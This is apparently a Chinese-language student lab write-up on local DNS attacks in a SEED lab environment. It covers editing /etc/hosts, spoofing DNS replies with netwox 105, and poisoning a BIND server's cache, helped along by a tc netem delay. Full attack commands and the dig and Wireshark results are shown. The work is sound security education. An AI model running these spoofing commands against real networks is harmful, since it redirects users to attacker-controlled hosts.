# 1. 本地`DNS`攻击

## 1.1 攻击原理

- 对用户进行`DNS`攻击的主要目标是在用户尝试使用`A`的主机名到达机器`A`时将用户重定向到另一台机器`B`。当用户在他/她的浏览器中键入某个域名时，用户的计算机将发出`DNS`查询以找出该网站的`IP`地址。攻击者的目标是使用伪造的`DNS`回复欺骗用户的计算机，该回复将主机名解析为恶意`IP`地址。
- 下图左侧为`DNS`缓存中毒攻击，右侧为直接欺骗用户响应攻击。

![1.1.1本地DNS攻击](https://raw.githubusercontent.com/BIIIANG/pic/main/202204222245374.jpg)

## 1.2 修改主机`HOSTS`文件

- `HOSTS`文件（`/etc/hosts`）中的主机名和`IP`地址对用于本地查找，它们优先于远程`DNS`查找。如果攻击者破坏了用户的计算机，他们可以修改`HOSTS`文件，以便在用户尝试访问特定站点时将用户重定向到恶意站点。
- 需要注意的是，`/etc/hosts`会被`dig`命令忽略，但会对`ping`命令和`Web`浏览器等生效。
- 将以下条目添加至`/etc/hosts`，其将`www.example.com`（对应`IP`为`93.184.216.34`）解析为`202.114.0.245`，即`www.hust.edu.cn`的地址：

```
202.114.0.245   www.example.com
```

- 添加以上条目后，清除`DNS`缓存，使用`ping www.example.com`进行测试，可以发现此时已被定向到`www.hust.edu.cn`的地址`202.114.0.245`：

```shell
[04/22/22]seed@VM:~/.../2022.04.15.DNS$ cat /etc/hosts
127.0.0.1	localhost
127.0.1.1	VM

202.114.0.245   www.example.com

# The following lines are desirable for IPv6 capable hosts
::1     ip6-localhost ip6-loopback
fe00::0 ip6-localnet
ff00::0 ip6-mcastprefix
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters
127.0.0.1       User
127.0.0.1       Attacker
127.0.0.1       Server
127.0.0.1       www.SeedLabSQLInjection.com
127.0.0.1       www.xsslabelgg.com
127.0.0.1       www.csrflabelgg.com
127.0.0.1       www.csrflabattacker.com
127.0.0.1	www.repackagingattacklab.com
127.0.0.1	www.seedlabclickjacking.com
127.0.0.1       wmzserver
[04/22/22]seed@VM:~/.../2022.04.15.DNS$ sudo rndc flush
[04/22/22]seed@VM:~/.../2022.04.15.DNS$ ping www.example.com -c 2
PING www.example.com (202.114.0.245) 56(84) bytes of data.
64 bytes from www.example.com (202.114.0.245): icmp_seq=1 ttl=128 time=1.56 ms
64 bytes from www.example.com (202.114.0.245): icmp_seq=2 ttl=128 time=1.65 ms

--- www.example.com ping statistics ---
2 packets transmitted, 2 received, 0% packet loss, time 1014ms
rtt min/avg/max/mdev = 1.565/1.609/1.653/0.044 ms
```

![1.2.1.修改hosts文件并清空dns缓存](https://raw.githubusercontent.com/BIIIANG/pic/main/202204222322171.png)

![1.2.2.ping被定向到错误的ip](https://raw.githubusercontent.com/BIIIANG/pic/main/202204222322151.png)

- 清理`firefox`的`History`记录后，打开`www.example.com`，提示证书错误，此时`hosts`文件的作用已经发挥，服务器和浏览器的安全策略阻止了不合法的请求：

![1.2.3.web证书错误](https://raw.githubusercontent.com/BIIIANG/pic/main/202204231239548.png)

- 在物理机上使用`go`运行一个伪造的网站服务器，访问物理机的`Web`服务将返回一个伪造的页面（程序及页面见`CODES/PhysicalMachine/networkSecurity`）。
- 向`/etc/hosts`中添加以下条目，`192.168.2.214`为物理机的`IP`，将`www.example.com`重定向到物理机：

```
192.168.2.214   www.example.com
```

- 添加以上条目后，清除`DNS`缓存，使用`ping www.example.com`进行测试，可以发现此时已被定向到`192.168.2.214`：

```shell
[04/23/22]seed@VM:~/.../2022.04.15.DNS$ cat /etc/hosts
127.0.0.1	localhost
127.0.1.1	VM

# 202.114.0.245   www.example.com
192.168.2.214   www.example.com
...
[04/23/22]seed@VM:~/.../2022.04.15.DNS$ sudo rndc flush
[04/23/22]seed@VM:~/.../2022.04.15.DNS$ ping www.example.com -c 2
PING www.example.com (192.168.2.214) 56(84) bytes of data.
64 bytes from www.example.com (192.168.2.214): icmp_seq=1 ttl=128 time=0.787 ms
64 bytes from www.example.com (192.168.2.214): icmp_seq=2 ttl=128 time=1.09 ms

--- www.example.com ping statistics ---
2 packets transmitted, 2 received, 0% packet loss, time 1001ms
rtt min/avg/max/mdev = 0.787/0.938/1.090/0.154 ms
```

![1.2.4.修改hosts文件并清空dns缓存](https://raw.githubusercontent.com/BIIIANG/pic/main/202204231241279.png)

![1.2.5.ping被定向到错误的ip](https://raw.githubusercontent.com/BIIIANG/pic/main/202204231241369.png)

- 在物理机运行服务端程序`go run main.go`，在虚拟机使用`firefox`打开`www.example.com`，已被定向到伪造的网站：

![1.2.6.被定向到错误的页面](https://raw.githubusercontent.com/BIIIANG/pic/main/202204231241068.png)

- 使用`dig www.example.com`进行测试，可以发现`dig`指令不受`hosts`文件影响：

```shell
[04/23/22]seed@VM:~/.../2022.04.15.DNS$ dig www.example.com

; <<>> DiG 9.10.3-P4-Ubuntu <<>> www.example.com
;; global options: +cmd
;; Got answer:
;; ->>HEADER<<- opcode: QUERY, status: NOERROR, id: 16426
;; flags: qr rd ra; QUERY: 1, ANSWER: 1, AUTHORITY: 0, ADDITIONAL: 1

;; OPT PSEUDOSECTION:
; EDNS: version: 0, flags:; MBZ: 0005 , udp: 4096
;; QUESTION SECTION:
;www.example.com.		IN	A

;; ANSWER SECTION:
www.example.com.	5	IN	A	93.184.216.34

;; Query time: 2 msec
;; SERVER: 192.168.33.2#53(192.168.33.2)
;; WHEN: Sat Apr 23 12:42:21 CST 2022
;; MSG SIZE  rcvd: 60
```

![1.2.7.dig不受hosts影响](https://raw.githubusercontent.com/BIIIANG/pic/main/202204231244617.png)



## 1.3 直接欺骗用户响应

### 1.3.1 攻击原理

- 在此次攻击中，受害者的计算机尚未受到破坏，因此攻击者无法直接更改受害者计算机上的`DNS`查询过程。但是，如果攻击者与受害者位于同一局域网，他们仍然可以造成巨大破坏。当用户在`web`浏览器中键入`web`站点的名称（主机名，如`www.example.net`）时，用户的计算机将向`DNS`服务器发出`DNS`请求，以解析主机名的`IP`地址。在听到这个`DNS`请求后，攻击者可以伪造一个虚假的 `DNS`响应，如果这个虚假的`DNS`响应符合以下条件，用户的计算机将接受它：
  1. 源`IP`地址必须匹配`DNS`服务器的`IP`地址；
  2. 目标`IP`地址必须与用户机器的`IP`地址匹配；
  3. 源端口号（`UDP`端口）必须与发送`DNS`请求的端口号匹配（通用端口`53`）；
  4. 目标端口号必须与发送`DNS`请求的端口号匹配；
  5. `UDP`校验和必须计算正确；
  6. 事务`ID`必须匹配`DNS`请求中的事务`ID`；
  7. 应答的问题部分中的域名必须与请求的问题部分中的域名匹配；
  8. 回答部分中的域名必须与`DNS`请求的问题部分中的域名匹配；
  9. 用户的计算机必须在接收到合法的`DNS`响应之前接收攻击者的`DNS`响应。
- 为了满足标准`1~8`，攻击者可以嗅探受害者发送的`DNS`请求消息；然后，攻击者可以创建虚假的`DNS`响应，并在真正的`DNS`服务器之前发回给受害者。

### 1.3.2 使用`netwox`进行攻击

- `netwox 105`工具的使用说明如下：

```shell
[04/29/22]seed@VM:~$ netwox 105 --help2
Title: Sniff and send DNS answers
+------------------------------------------------------------------------+
| This tool sniffs and replies to DNS requests. It will always return    |
| the same information. It can be used to redirect network flow to a     |
| computer.                                                              |
| The 'hostname' parameter is not used for type A queries.               |
| The 'hostnameip' parameter is not used for type PTR queries.           |
|                                                                        |
| Parameter --hostname defines the hostname to tell (www.example.com).   |
| Parameter --hostnameip defines IP address of this hostname (1.2.3.4).  |
| Parameter --authns is the authoritative name server (ns.example.com).  |
| Parameter --authnsip defines IP address of name server (1.2.3.5).      |
| Parameter --ttl defines the Time To Live of this reply.                |
|                                                                        |
| Parameter --device indicates on which device to sniff. Please note     |
| that under some systems, such as Windows, sniffing on some devices is  |
| not supported.                                                         |
| Parameter --filter defines the sniff filter. It permits to restrict    |
| captured packets. This kind of filter is named a BPF or pcap filter.   |
| Basic elements of a filter are:                                        |
|   host 1.2.3.4                                                         |
|   net 192.168.10                                                       |
|   net 192.168.10.0 mask 255.255.255.0                                  |
|   net 192.168.10.0/24                                                  |
|   port 21                                                              |
|   dst host 1.2.3.4                                                     |
|   src port 2345                                                        |
|   ether host a:b:c:d:e:f ('ether a:b:c:d:e:f' is not working)          |
|   ether src aa:bb:cc:dd:ee:ff                                          |
|   ip                                                                   |
|   arp                                                                  |
|   rarp                                                                 |
|   tcp                                                                  |
|   icmp                                                                 |
|   udp                                                                  |
| Here are filter examples:                                              |
|   "host 1.2.3.4"                                                       |
|   "net 192.168 and icmp"                                               |
|   "host 1.2.3.4 or dst port 80"                                        |
|   "(udp or tcp) and not host 1.2.3.4"                                  |
| Parameter --spoofip indicates how to generate link layer for spoofing. |
| Values 'best', 'link' or 'raw' are common choices for --spoofip. Here  |
| is the list of accepted values:                                        |
|  - 'raw' means to spoof at IP4/IP6 level (it uses system IP stack). If |
|    a firewall is installed, or on some systems, this might not work.   |
|  - 'linkf' means to spoof at link level (currently, only Ethernet is   |
|    supported). The 'f' means to Fill source Ethernet address.          |
|    However, if source IP address is spoofed, it might be impossible    |
|    to Fill it. So, linkf will not work: use linkb or linkfb instead.   |
|  - 'linkb' means to spoof at link level. The 'b' means to left a Blank |
|    source Ethernet address (0:0:0:0:0:0, do not try to Fill it).       |
|  - 'linkfb' means to spoof at link level. The 'f' means to try to Fill |
|    source Ethernet address, but if it is not possible, it is left      |
|    Blank.                                                              |
|  - 'rawlinkf' means to try 'raw', then try 'linkf'                     |
|  - 'rawlinkb' means to try 'raw', then try 'linkb'                     |
|  - 'rawlinkfb' means to try 'raw', then try 'linkfb'                   |
|  - 'linkfraw' means to try 'linkf', then try 'raw'                     |
|  - 'linkbraw' means to try 'linkb', then try 'raw'                     |
|  - 'linkfbraw' means to try 'linkfb', then try 'raw'                   |
|  - 'link' is an alias for 'linkfb'                                     |
|  - 'rawlink' is an alias for 'rawlinkfb'                               |
|  - 'linkraw' is an alias for 'linkfbraw'                               |
|  - 'best' is an alias for 'linkraw'. It should work in all cases.      |
|                                                                        |
| This tool may need to be run with admin privilege in order to sniff    |
| and spoof.                                                             |
+------------------------------------------------------------------------+
Synonyms: bind
Usage: netwox 105 -h hostname -H ip -a hostname -A ip [-d device] [-T uint32] [-f filter] [-s spoofip]
Parameters:
 -h|--hostname hostname         hostname {www.example.com}
 -H|--hostnameip ip             hostname IP {1.2.3.4}
 -a|--authns hostname           authoritative name server {ns.example.com}
 -A|--authnsip ip               authns IP {1.2.3.5}
 -d|--device device             device name {Eth0}
 -T|--ttl uint32                ttl in seconds {10}
 -f|--filter filter             pcap filter
 -s|--spoofip spoofip           IP spoof initialization type {best}
 --help                         display simple help
 --kbd                          ask missing parameters from keyboard
 --kbd-k or --kbd-name          ask parameter -k|--name from keyboard
 --argfile file                 ask missing parameters from file
Example: netwox 105 -h "www.example.com" -H "1.2.3.4" -a "ns.example.com" -A "1.2.3.5"
Example: netwox 105 --hostname "www.example.com" --hostnameip "1.2.3.4" --authns "ns.example.com" --authnsip "1.2.3.5"
```

- 攻击前，在客户机使用`dig www.hust.edu.cn`进行`DNS`请求，结果如下所示，该域名对应的正确`IP`为`202.114.0.245`：

```shell
root@DNS_User:/# dig www.hust.edu.cn

; <<>> DiG 9.10.3-P4-Ubuntu <<>> www.hust.edu.cn
;; global options: +cmd
;; Got answer:
;; ->>HEADER<<- opcode: QUERY, status: NOERROR, id: 37506
;; flags: qr rd ra; QUERY: 1, ANSWER: 1, AUTHORITY: 2, ADDITIONAL: 4

;; OPT PSEUDOSECTION:
; EDNS: version: 0, flags:; udp: 4096
;; QUESTION SECTION:
;www.hust.edu.cn.		IN	A

;; ANSWER SECTION:
www.hust.edu.cn.	7200	IN	A	202.114.0.245

;; AUTHORITY SECTION:
hust.edu.cn.		172800	IN	NS	dns1.hust.edu.cn.
hust.edu.cn.		172800	IN	NS	dns2.hust.edu.cn.

;; ADDITIONAL SECTION:
dns1.hust.edu.cn.	172800	IN	A	202.114.0.120
dns1.hust.edu.cn.	172800	IN	AAAA	2001:250:4000:2002::888
dns2.hust.edu.cn.	172800	IN	A	59.172.234.181

;; Query time: 4528 msec
;; SERVER: 172.18.0.3#53(172.18.0.3)
;; WHEN: Fri Apr 29 23:09:51 CST 2022
;; MSG SIZE  rcvd: 158
```

![1.3.1.正确的DNS解析结果](https://raw.githubusercontent.com/BIIIANG/pic/main/202204301704197.png)

- 攻击前先清空`DNS`服务器的`DNS`缓存并重启`bind9`服务，以延长服务器相应`DNS`请求的时间，提高攻击成功概率：

```shell
root@DNS_Server:/# sudo rndc flush
root@DNS_Server:/# sudo service bind9 restart
 * Stopping domain name service... bind9
waiting for pid 569 to die
                                                               [ OK ]
 * Starting domain name service... bind9                       [ OK ]
```

![1.3.2.清理缓存](https://raw.githubusercontent.com/BIIIANG/pic/main/202204301704339.png)

- 使用`netwox`伪造`www.hust.edu.cn`的`IP`地址：`sudo netwox 105 -h "www.hust.edu.cn" -H "172.18.0.1" -a "ns.hust.edu.cn" -A "201.91.180.3" -d br-e4a075733e38 -T 600 -f "src host 172.18.0.2"`，其中伪造的`IP`为攻击机的`IP`，伪造的`ns.hust.edu.cn`的`IP`为学号`U201911803`生成的错误`IP`：
  - `-h|--hostname`：域名；
  - `-H|--hostnameip`：域名对应的`ip`；
  -  `-a|--authns`：权威域名服务器；
  -  `-A|--authnsip`：权威域名服务器对应的`ip`；
  - `-d|--device`：要攻击的网卡名；
  - `-T|--ttl`：`DNS`结果的存活时间；
  - `-f|--filter`：过滤器；
  - `-s|--spoofip`：`ip`伪造类型。
- 然后在客户机使用`dig www.hust.edu.cn`进行`DNS`请求，结果如下所示，返回的`IP`地址为上述伪造的`IP`：

```shell
root@DNS_User:/# dig www.hust.edu.cn

; <<>> DiG 9.10.3-P4-Ubuntu <<>> www.hust.edu.cn
;; global options: +cmd
;; Got answer:
;; ->>HEADER<<- opcode: QUERY, status: NOERROR, id: 19258
;; flags: qr aa rd ra; QUERY: 1, ANSWER: 1, AUTHORITY: 1, ADDITIONAL: 1

;; QUESTION SECTION:
;www.hust.edu.cn.		IN	A

;; ANSWER SECTION:
www.hust.edu.cn.	600	IN	A	172.18.0.1

;; AUTHORITY SECTION:
ns.hust.edu.cn.		600	IN	NS	ns.hust.edu.cn.

;; ADDITIONAL SECTION:
ns.hust.edu.cn.		600	IN	A	201.91.180.3

;; Query time: 17 msec
;; SERVER: 172.18.0.3#53(172.18.0.3)
;; WHEN: Sat Apr 30 16:38:52 CST 2022
;; MSG SIZE  rcvd: 88
```

![1.3.3.错误的DNS解析结果](https://raw.githubusercontent.com/BIIIANG/pic/main/202204301705475.png)

- 攻击机的`netwox`输出如下所示：

```shell
[04/30/22]seed@VM:~/.../2022.04.15.DNS$ sudo netwox 105 -h "www.hust.edu.cn" -H "172.18.0.1" -a "ns.hust.edu.cn" -A "201.91.180.3" -d br-e4a075733e38 -T 600 -f "src host 172.18.0.2"
DNS_question____________________________________________________.
| id=19258  rcode=OK             opcode=QUERY                   |
| aa=0 tr=0 rd=1 ra=0  quest=1  answer=0  auth=0  add=1         |
| www.hust.edu.cn. A                                            |
| . OPT UDPpl=4096 errcode=0 v=0 ...                            |
|_______________________________________________________________|
DNS_answer______________________________________________________.
| id=19258  rcode=OK             opcode=QUERY                   |
| aa=1 tr=0 rd=1 ra=1  quest=1  answer=1  auth=1  add=1         |
| www.hust.edu.cn. A                                            |
| www.hust.edu.cn. A 600 172.18.0.1                             |
| ns.hust.edu.cn. NS 600 ns.hust.edu.cn.                        |
| ns.hust.edu.cn. A 600 201.91.180.3                            |
|_______________________________________________________________|
```

![1.3.4.netwox的欺骗过程](https://raw.githubusercontent.com/BIIIANG/pic/main/202204301705873.png)

- 使用`Wireshark`截取的数据包`1.3.1-直接欺骗用户响应.pcapng `如下所示，数据包`1`为`DNS`询问，数据包`4`为伪造的`DNS`响应：

![1.3.5.DNS数据包](https://raw.githubusercontent.com/BIIIANG/pic/main/202205012226858.png)

### 1.3.3 使用`scapy`进行攻击

- 在进行完`1.4.3 使用scapy进行DNS缓存中毒攻击`后，只需将攻击程序的`filter`修改为`'udp and dst port 53 and src host 172.18.0.2'`，得到程序`directly_spoofing_response.py`，使用该程序也可以完成直接欺骗用户响应的攻击，此处不再赘述。

<div style="page-break-after: always;"></div>

## 1.4 `DNS`缓存中毒攻击

### 1.4.1 攻击原理

当`DNS`服务器`Apollo`收到查询时，如果主机名不在`Apollo`的域中，它将要求其他`DNS`服务器解析主机名。请注意，在我们的实验设置中，我们的`DNS`服务器的域名是`xubiang.com`; 因此，对于其他域（例如`xubiang.net`）的`DNS`查询， `DNS`服务器`Apollo`将询问其他`DNS`服务器。但是，在`Apollo`询问其他`DNS`服务器之前，它首先从自己的缓存中寻找答案 ; 如果有答案，`DNS`服务器`Apollo`将简单地回复其缓存中的信息。如果答案不在缓存中， `DNS`服务器将尝试从其他 `DNS`服务器获得答案。 当`Apollo`得到答案时，它会将答案存储在缓存中，因此下次无需询问其他`DNS`服务器。 因此，如果攻击者可以欺骗来自其他`DNS`服务器的响应，`Apollo`会将欺骗性响应保留在其缓存中一段时间。下次，当用户的计算机想要解析相同的主机名时，`Apollo`将使用缓存中的欺骗响应进行回复。这样，攻击者只需要欺骗一次，就能将影响持续到缓存的信息到期为止。 此攻击称为`DNS`缓存中毒。

### 1.4.2 使用`netwox`进行攻击

- 攻击前，在客户机使用`dig www.hust.edu.cn`进行`DNS`请求，结果与`1.3.2 使用netwox进行攻击`相同，该域名对应的正确`IP`为`202.114.0.245`。
- 攻击前先清空`DNS`服务器的`DNS`缓存并重启`bind9`服务，以延长服务器相应`DNS`请求的时间，提高攻击成功概率（每次进行攻击前均进行以下操作，不再赘述）：

```shell
root@DNS_Server:/# sudo rndc flush
root@DNS_Server:/# sudo service bind9 restart
 * Stopping domain name service... bind9
  waiting for pid 1465 to die
                                                               [ OK ]
 * Starting domain name service... bind9                       [ OK ]
```

![1.4.1.清除DNS缓存](https://raw.githubusercontent.com/BIIIANG/pic/main/202204301954262.png)

#### 1.4.2.1 一些失败的尝试

- 使用`netwox`伪造`www.hust.edu.cn`的`IP`地址：`sudo netwox 105 -h "www.hust.edu.cn" -H "172.18.0.1" -a "ns.hust.edu.cn" -A "201.91.180.3" -d br-e4a075733e38 -T 11803 -f "src host 172.18.0.3" -s "raw"`，其中伪造的`IP`为攻击机的`IP`，伪造的`ns.hust.edu.cn`的`IP`为学号`U201911803`生成的错误`IP`。
  - 使用`-s "raw"`的原因是：**（此处为参考指导书，前三次失败的攻击使用了该参数，而在后续尝试中发现不应该使用该参数，具体原因见后续实验）**`raw`选项指定仅在`ip`层进行欺骗，若不选择`raw`，则`Netwox 105`将对被欺骗的`IP`地址也进行`MAC`地址欺骗。为了获得`MAC`地址，该工具发出`ARP`请求，询问欺骗`IP`的`MAC`地址。此欺骗`IP`地址通常是外部`DNS`服务器的`IP`地址，该服务器不在同一`LAN`上。因此，没有主机会回复`ARP`请求。该工具将在没有`MAC`地址的情况下等待`ARP`回复一段时间。 这个等待会使工具发出欺骗性响应延迟。如果实际的`DNS`响应早于欺骗响应，则攻击将失败。
- 在首次尝试攻击时，前几次在客户机使用`dig www.hust.edu.cn`进行`DNS`请求均会失败，之后会得到正确的结果，攻击没有生效，失败的`DNS`询问与正确的结果如下：

```shell
## 失败的查询
root@DNS_User:/# dig www.hust.edu.cn

; <<>> DiG 9.10.3-P4-Ubuntu <<>> www.hust.edu.cn
;; global options: +cmd
;; Got answer:
;; ->>HEADER<<- opcode: QUERY, status: SERVFAIL, id: 45806
;; flags: qr rd ra; QUERY: 1, ANSWER: 0, AUTHORITY: 0, ADDITIONAL: 1

;; OPT PSEUDOSECTION:
; EDNS: version: 0, flags:; udp: 4096
;; QUESTION SECTION:
;www.hust.edu.cn.		IN	A

;; Query time: 4985 msec
;; SERVER: 172.18.0.3#53(172.18.0.3)
;; WHEN: Sat Apr 30 19:42:08 CST 2022
;; MSG SIZE  rcvd: 44

## 多次尝试后成功的查询，结果正确
root@DNS_User:/# dig www.hust.edu.cn

; <<>> DiG 9.10.3-P4-Ubuntu <<>> www.hust.edu.cn
;; global options: +cmd
;; Got answer:
;; ->>HEADER<<- opcode: QUERY, status: NOERROR, id: 807
;; flags: qr rd ra; QUERY: 1, ANSWER: 1, AUTHORITY: 2, ADDITIONAL: 4

;; OPT PSEUDOSECTION:
; EDNS: version: 0, flags:; udp: 4096
;; QUESTION SECTION:
;www.hust.edu.cn.		IN	A

;; ANSWER SECTION:
www.hust.edu.cn.	7200	IN	A	202.114.0.245

;; AUTHORITY SECTION:
hust.edu.cn.		172800	IN	NS	dns2.hust.edu.cn.
hust.edu.cn.		172800	IN	NS	dns1.hust.edu.cn.

;; ADDITIONAL SECTION:
dns1.hust.edu.cn.	172800	IN	A	202.114.0.120
dns1.hust.edu.cn.	172800	IN	AAAA	2001:250:4000:2002::888
dns2.hust.edu.cn.	172800	IN	A	59.172.234.181

;; Query time: 2737 msec
;; SERVER: 172.18.0.3#53(172.18.0.3)
;; WHEN: Sat Apr 30 19:42:53 CST 2022
;; MSG SIZE  rcvd: 158
```

![1.4.2.失败的查询](https://raw.githubusercontent.com/BIIIANG/pic/main/202204301954253.png)

![1.4.3.成功的查询，但攻击失败](https://raw.githubusercontent.com/BIIIANG/pic/main/202204301954493.png)

- 此时的攻击失败的现象与`0.3.5 测试DNS服务器`相似，观察使用`Wireshark`获取的数据包（见`1.4.1-失败的DNS缓存中毒攻击.pcapng`），并于未开启攻击时的数据包（见`1.4.2-正常情况下的DNS数据包.pcapng`）进行比对。在`1.2-失败的DNS缓存中毒攻击.pcapng`中，数据包`3`为攻击目标`DNS`服务器向外部`DNS`服务器询问`www.hust.edu.cn`的`IP`，而数据包`7`即为外部`DNS`服务器的响应，该响应中没有任何有效响应信息，因此判断不是由`netwox`发送的伪造响应。二者之间的时间间隔仅为`0.026652004`秒，推测是外部`DNS`服务器的响应过于迅速，导致`netwox`的欺骗响应不能在真正的响应之前到达，导致攻击失败。外部`DNS`服务器的响应如下**（注：此处原因判断错误，真正失败原因见后续实验）**：

![1.4.4.快速响应的外部DNS报文](https://raw.githubusercontent.com/BIIIANG/pic/main/202204301954078.png)

- 为了解决上述攻击失败的问题，在攻击机上使用流量控制工具`TC`对`DNS`服务器`172.18.0.3`与外部`DNS`服务器间的流量进行延时，以提高攻击成功的概率：`sudo tc qdisc add dev ens33 root netem delay 1s`，[该命令](https://netbeez.net/blog/how-to-use-the-linux-traffic-control/)的含义如下（见[`man tc`](https://man7.org/linux/man-pages/man8/tc.8.html)）：
  - `qdisc`：`queueing discipline`；
  - `add`：`Add a qdisc, class or filter to a node`；
  - `dev ens33`：访问外部网络的网卡；
  - `root`：`In the absence of classful qdiscs, classless qdiscs can only be attached at the root of a device.`
  - `netem`：`Network Emulator, an enhancement of the Linux traffic control facilities that allow to add delay, packet loss, duplication and more other characteristics to packets outgoing from a selected network interface`；
  - `delay 1s`：添加`1s`的延时；
  - 注：解除该延时规则的命令为`sudo tc qdisc del dev ens33 root`，查看当前`TC`条目的命令为`tc qdisc show dev ens33`。
- 添加以上延时并清除`DNS`服务器的缓存后，再次使用`netwox`伪造`www.hust.edu.cn`的`IP`地址：`sudo netwox 105 -h "www.hust.edu.cn" -H "172.18.0.1" -a "ns.hust.edu.cn" -A "201.91.180.3" -d br-e4a075733e38 -T 11803 -f "src host 172.18.0.3" -s "raw"`。
- 然后在客户机使用`dig www.hust.edu.cn`进行`DNS`请求，现象与未添加延时时相似，只是得到正确解析的速度稍慢，攻击仍然没有成功。
- 分析使用`Wireshark`获得的数据包`1.4.3-第二次失败的DNS缓存中毒攻击.pcapng`，此时的响应报文仍然没有携带任何回应信息，且该响应与对应的请求报文的时间差较大，猜想也受到了延时的影响，但如果该报文为`netwox`伪造，那么不应该受到延时影响，此时开始怀疑以上的分析是否正确：

![1.4.5.仍然没有正确响应](https://raw.githubusercontent.com/BIIIANG/pic/main/202204302217790.png)

- 为了确认以上攻击失败的原因分析是否正确，将物理机的网络断开，此时虚拟机虽然仍然具有网络连接，但已经无法得到外界的`DNS`请求，此时再重新进行攻击，在客户机进行一次`dig www.hust.edu.cn`尝试，发现此时若在`Wireshark`内以`DNS`为过滤条件，则全部都是`DNS QUERY`的数据包，没有找到`netwox`伪造的报文（见`1.4.4-第三次失败的DNS缓存中毒攻击(断网)`）：

![1.4.6.没有netwox伪造的报文](https://raw.githubusercontent.com/BIIIANG/pic/main/202204302217762.png)

- 此时突然发现，`netwox`本身一直提示有发送`DNS`响应，但此时在`Wireshark`中使用`DNS`进行过滤却无法发现对应的数据包，因此将过滤条件取消，查看所有数据包，发现了`netwox`发送的数据包，`Wireshark`没有将其解析为`DNS`数据包（见`1.4.4-第三次失败的DNS缓存中毒攻击(断网)`），查看这些数据包的信息，再与其他正常解析的`DNS`响应数据包比较，猜想是由于他们使用的是`1`号端口而不是`53`号端口导致的（**原因未知**）。查看之前攻击失败时捕获的数据包，发现与此处情况相同：

![1.4.7.netwox伪造的报文没有被正确解析](https://raw.githubusercontent.com/BIIIANG/pic/main/202204302217707.png)

- 此时将`-s "raw"`改为`-s "best"`再次尝试，攻击仍然失败，但此时观察`Wireshark`获得的数据包（见`1.4.5-第四次失败的DNS缓存中毒攻击.pcapng`），可以清楚地发现伪造的数据包`19`，只是相较于真实的响应数据包`8`，伪造数据包的到达速度仍然偏慢：

![1.4.8.第四次失败](https://raw.githubusercontent.com/BIIIANG/pic/main/202204302235538.png)

- 因此尝试增大延时**（以下实验均在该设置下进行）**：

```shell
[04/30/22]seed@VM:~$ tc qdisc show dev ens33
qdisc netem 8002: root refcnt 2 limit 1000 delay 1.0s
[04/30/22]seed@VM:~$ sudo tc qdisc del dev ens33 root
[04/30/22]seed@VM:~$ sudo tc qdisc add dev ens33 root netem delay 5s
```

![1.4.9.增大延时](https://raw.githubusercontent.com/BIIIANG/pic/main/202204302239690.png)

#### 1.4.2.2 成功的攻击

- 增大延时并清除`DNS`服务器的缓存后，再次使用`netwox`伪造`www.hust.edu.cn`的`IP`地址：`sudo netwox 105 -h "www.hust.edu.cn" -H "172.18.0.1" -a "ns.hust.edu.cn" -A "201.91.180.3" -d br-e4a075733e38 -T 11803 -f "src host 172.18.0.3" -s "best"`。
- 然后在客户机使用`dig www.hust.edu.cn`进行`DNS`请求，第一次`dig`超时没有得到回应；第二次`dig`可以看到伪造的所有信息均出现在结果中，且`TTL`均在`11803`附近，攻击成功：

```shell
root@DNS_User:/# dig www.hust.edu.cn

; <<>> DiG 9.10.3-P4-Ubuntu <<>> www.hust.edu.cn
;; global options: +cmd
;; Got answer:
;; ->>HEADER<<- opcode: QUERY, status: SERVFAIL, id: 9773
;; flags: qr rd ra; QUERY: 1, ANSWER: 0, AUTHORITY: 0, ADDITIONAL: 1

;; OPT PSEUDOSECTION:
; EDNS: version: 0, flags:; udp: 4096
;; QUESTION SECTION:
;www.hust.edu.cn.		IN	A

;; Query time: 4999 msec
;; SERVER: 172.18.0.3#53(172.18.0.3)
;; WHEN: Sat Apr 30 22:45:22 CST 2022
;; MSG SIZE  rcvd: 44

root@DNS_User:/# dig www.hust.edu.cn

; <<>> DiG 9.10.3-P4-Ubuntu <<>> www.hust.edu.cn
;; global options: +cmd
;; Got answer:
;; ->>HEADER<<- opcode: QUERY, status: NOERROR, id: 925
;; flags: qr rd ra; QUERY: 1, ANSWER: 1, AUTHORITY: 1, ADDITIONAL: 2

;; OPT PSEUDOSECTION:
; EDNS: version: 0, flags:; udp: 4096
;; QUESTION SECTION:
;www.hust.edu.cn.		IN	A

;; ANSWER SECTION:
www.hust.edu.cn.	11803	IN	A	172.18.0.1

;; AUTHORITY SECTION:
.			11801	IN	NS	ns.hust.edu.cn.

;; ADDITIONAL SECTION:
ns.hust.edu.cn.		11801	IN	A	201.91.180.3

;; Query time: 4792 msec
;; SERVER: 172.18.0.3#53(172.18.0.3)
;; WHEN: Sat Apr 30 22:45:39 CST 2022
;; MSG SIZE  rcvd: 92
```

![1.4.10.第一次dig超时](https://raw.githubusercontent.com/BIIIANG/pic/main/202204302302441.png)

![1.4.11.第二次dig攻击成功](https://raw.githubusercontent.com/BIIIANG/pic/main/202204302302875.png)

- 此时关闭攻击，再次在客户机使用`dig www.hust.edu.cn`进行`DNS`请求，结果依然为攻击者伪造的信息，且`TTL`相应地减小：

```shell
root@DNS_User:/# dig www.hust.edu.cn

; <<>> DiG 9.10.3-P4-Ubuntu <<>> www.hust.edu.cn
;; global options: +cmd
;; Got answer:
;; ->>HEADER<<- opcode: QUERY, status: NOERROR, id: 39540
;; flags: qr rd ra; QUERY: 1, ANSWER: 1, AUTHORITY: 1, ADDITIONAL: 2

;; OPT PSEUDOSECTION:
; EDNS: version: 0, flags:; udp: 4096
;; QUESTION SECTION:
;www.hust.edu.cn.		IN	A

;; ANSWER SECTION:
www.hust.edu.cn.	11666	IN	A	172.18.0.1

;; AUTHORITY SECTION:
.			11664	IN	NS	ns.hust.edu.cn.

;; ADDITIONAL SECTION:
ns.hust.edu.cn.		11664	IN	A	201.91.180.3

;; Query time: 0 msec
;; SERVER: 172.18.0.3#53(172.18.0.3)
;; WHEN: Sat Apr 30 22:47:56 CST 2022
;; MSG SIZE  rcvd: 92
```

![1.4.12.第三次dig结果不变](https://raw.githubusercontent.com/BIIIANG/pic/main/202204302302367.png)

- 以上成功攻击过程中`Wireshark`捕获的数据包见`1.4.6-成功的DNS缓存中毒攻击.pcapng`，以下为其中的部分数据包；`netwox`的输出过多，此处不再叙述：

![1.4.13.成功攻击的抓包](https://raw.githubusercontent.com/BIIIANG/pic/main/202204302303631.png)

- 接下来将`DNS`服务器的缓存转储下来并查看（见`dump_netwox.db`），部分内容如下，由`9 ~ 17`行的条目可见针对`DNS`服务器的`DNS`缓存中毒攻击成功：

```shell
